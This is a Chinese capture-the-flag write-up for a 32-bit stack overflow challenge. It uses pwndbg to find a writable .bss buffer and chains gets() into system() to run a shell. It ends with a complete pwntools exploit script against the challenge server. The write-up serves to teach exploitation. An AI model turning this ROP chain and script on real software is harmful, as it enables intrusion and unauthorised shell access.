# 挑战简介
32位的 system(); 但是好像没"/bin/sh" 上面的办法不行了，想想办法

# 思路
对于32位的系统，没有/bin/sh的情况，我们就要想办法，看能不能获取自己的输入并system执行自己的输入

offset = 0x6C+0x4  

system_addr = 0x8048450

get_addr = 0x8048420

get用于截取你的输入，system用于执行你的输入，但是少了什么？

没错，就是buf，存储间

这里就要用pwndbg来查看每个内存段的读写权限

```
b main

run

vmmap
```
![image](https://github.com/user-attachments/assets/8d44816c-bb23-4384-8cf7-05a752b6d0a1)

可以发现0x804b000-0x804c000有读写权限，去这一段地址找

.bss段内发现

![image](https://github.com/user-attachments/assets/1b1b499d-c797-47c5-9b95-4093e85f253a)

buf2_addr = 0x804B060

因此构造payload = b'a' * offset + p32(get_addr) + p32(system_addr) + p32(buf2_addr) + p32(buf2_addr)

第一次 buf2_addr 是作为 gets 函数的参数，告诉 gets 把接收到的输入（即 /bin/sh）存放到哪里。  
第二次 buf2_addr 是作为 system 函数的参数，告诉 system 要执行的命令字符串存放在哪里（也就是刚刚 gets 写入 /bin/sh 的地方）。  

```
#!/usr/bin/python3
from pwn import *
context.log_level = "debug"

p= remote("pwn.challenge.ctf.show",28184)

offset = 0x6C + 0x4

system_addr = 0x8048450

buf2_addr = 0x804B060

get_addr = 0x8048420

payload = b'a' * offset + p32(get_addr) + p32(system_addr) + p32(buf2_addr) + p32(buf2_addr)

print(payload)

p.sendline(payload)

p.sendline("/bin/sh")

p.interactive()

```
